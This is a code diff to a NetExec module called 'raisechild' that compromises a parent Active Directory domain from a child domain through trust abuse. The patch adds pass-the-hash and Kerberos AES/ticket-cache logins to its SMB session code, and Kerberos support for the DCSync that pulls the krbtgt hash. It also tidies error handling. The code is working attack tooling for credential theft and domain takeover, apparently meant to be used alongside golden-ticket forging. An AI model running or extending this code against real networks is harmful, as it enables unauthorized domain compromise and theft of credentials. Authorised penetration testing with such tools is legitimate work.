@@ -4,13 +4,14 @@ from impacket.smbconnection import SMBConnection
 from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
 from impacket.dcerpc.v5.drsuapi import DCERPCSessionError
 from ticketer import TICKETER
+from nxc.parsers.ldap_results import parse_result_attributes
+from nxc.helpers.misc import CATEGORY
 
 class NXCModule:
     name = "raisechild"
     description = "Compromise parent domain from child domain via trust abuse @azoxlpf"
     supported_protocols = ["ldap"]
-    opsec_safe = False
-    multiple_hosts = True
+    category = CATEGORY.PRIVILEGE_ESCALATION
 
     def __init__(self, context=None, module_options=None):
         self.context = context
@@ -40,7 +41,6 @@ class NXCModule:
         """
         self.context        = context
         self.module_options = module_options
-
 
     def on_login(self, context, connection):
         self.context = context
@@ -103,31 +103,55 @@ class NXCModule:
 
     def _get_smb_session(self, ldap_conn):
          target      = ldap_conn.host
-         remote_name = ldap_conn.hostname
-         domain_fqdn = ldap_conn.domain
-         domain_net  = domain_fqdn.split('.')[0]
+         remote_name = getattr(ldap_conn, "hostname", None) or target
+         # Upper-case realm for Kerberos; keep short NetBIOS for NTLM
+         domain_fqdn = (getattr(ldap_conn, "domain", "") or "").upper()
+         domain_net  = domain_fqdn.split('.')[0] if domain_fqdn else ""
 
          smb = SMBConnection(remoteName=remote_name,
                              remoteHost=target,
                              sess_port=445)
 
-         if getattr(ldap_conn, 'kerberos', False):
+         use_k = bool(getattr(ldap_conn, 'kerberos', False) or
+                      getattr(ldap_conn, 'use_kcache', False) or
+                      getattr(ldap_conn, 'aesKey', None))
+
+         cred_hash = getattr(ldap_conn, 'hash', '') or ''
+         lmhash, nthash = '', ''
+         if cred_hash:
+             if ':' in cred_hash:
+                 lmhash, nthash = cred_hash.split(':', 1)
+             else:
+                 nthash = cred_hash
+
+         if use_k:
              smb.kerberosLogin(
                  user      = ldap_conn.username or '',
-                 password  = ldap_conn.password or '',
+                 password  = getattr(ldap_conn, 'password', '') or '',
                  domain    = domain_fqdn,
-                 kdcHost   = target,
+                 lmhash    = lmhash,
+                 nthash    = nthash,
+                 aesKey    = getattr(ldap_conn, 'aesKey', '') or '',
+                 kdcHost   = getattr(ldap_conn, 'kdcHost', None) or target,
                  useCache  = getattr(ldap_conn, 'use_kcache', False)
              )
+         elif nthash or lmhash:
+             # NTLM pass-the-hash
+             smb.login(ldap_conn.username or '', '', domain_net, lmhash=lmhash, nthash=nthash)
          else:
-             smb.login(ldap_conn.username, ldap_conn.password, domain_net)
+             # NTLM with cleartext password
+             smb.login(ldap_conn.username, getattr(ldap_conn, 'password', '') or '', domain_net)
 
          return smb
 
     def _dcsync_krbtgt(self, smb_conn, connection):
         rop, ntds = None, None
         try:
-            use_kerb = getattr(connection, "kerberos", False)
+            # If SMB was Kerberos (kcache/AES/-k), use Kerberos for RPC too
+            use_kerb = bool(getattr(connection, "kerberos", False) or
+                            getattr(connection, "use_kcache", False) or
+                            getattr(connection, "aesKey", None))
+
             rop = RemoteOperations(smb_conn, doKerberos=use_kerb,
                        kdcHost=getattr(connection, "kdcHost", None))
             rop.enableRegistry()
@@ -176,7 +200,10 @@ class NXCModule:
                 if rop:  rop.finish()
             except Exception:
                 pass
-            smb_conn.logoff()
+            try:
+                smb_conn.logoff()
+            except Exception:
+                pass
 
     def get_krbtgt_hash(self, connection):
         try:
